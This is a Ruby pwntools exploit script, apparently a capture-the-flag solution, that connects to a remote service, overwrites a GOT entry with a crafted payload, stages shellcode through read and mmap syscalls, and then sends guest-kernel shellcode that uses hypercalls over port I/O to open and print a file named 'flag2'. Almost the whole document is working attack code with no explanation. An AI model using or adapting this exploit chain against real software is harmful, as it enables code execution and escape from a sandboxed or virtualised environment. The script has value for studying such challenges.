#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '35.200.23.198', 31733
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
# $z = Tubes::Process.new('../release/user.elf')
def z;$z;end
@p = '../release/user.elf'
# def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = 'amd64'

stack_at = 0x2020a4
shellcode_at = 0x2030a4 + 20
target = elf.got.write
payload = "#{(stack_at - target) / 4 - 2}_\\" # top = -xx s.t. stack[top] @ got.printf
payload << 'h:'

payload << "#{shellcode_at - (elf.plt.write + 6)}+h;"

payload << ','

payload = payload.ljust(20, '?')
payload << asm(
  "lea rbp, [rip + shellcode]\n" +
  shellcraft.syscall('SYS_read', 0, 'rbp', 2048) +
  "nop\nnop\nnop\nnop\nshellcode:\n"
)
log.dump payload
fail if payload =~ /\s/
z.puts payload
sleep(0.1)

shellcode = asm(
  shellcraft.syscall('SYS_mmap', 0, 0x1000000, 7, 0, -1, 0) +
  shellcraft.syscall('SYS_read', 0, 'rax', 0x1000000)
)

z.write shellcode
sleep(0.1)

k_shellcode = "\x90" * 0xe78 + asm(<<-EOS)
  lea rdi, [rip+flag2]
  and rdi, 0xfffff
  call hp_open
  mov rdi, rax
  mov rsi, 0
  cdq  
  mov dh, 1
  call hp_read
  mov rdi, 1
  mov rsi, 0
  mov rdx, rax
  call hp_write

  hlt
  hp_open:
    mov esi, edi
    mov edi, 0x8000
    jmp hypercall

  hp_read:
    lea rax, [rip+buf]
    mov qword ptr [rax], rdi
    mov qword ptr [rax+8], rsi
    mov qword ptr [rax+16], rdx
    mov esi, eax
    mov edi, 0x8001
    jmp hypercall

  hp_write:
    lea rax, [rip+buf]
    mov qword ptr [rax], rdi
    mov qword ptr [rax+8], rsi
    mov qword ptr [rax+16], rdx
    mov esi, eax
    mov edi, 0x8002
    jmp hypercall

  hypercall:
    mov dx, di
    mov eax, esi
    out dx, eax
    in eax, dx
    mov edi, eax
    mov eax, edi
    ret
  flag2: .string "flag2"
  buf:
EOS
z.write(k_shellcode)
z.interact
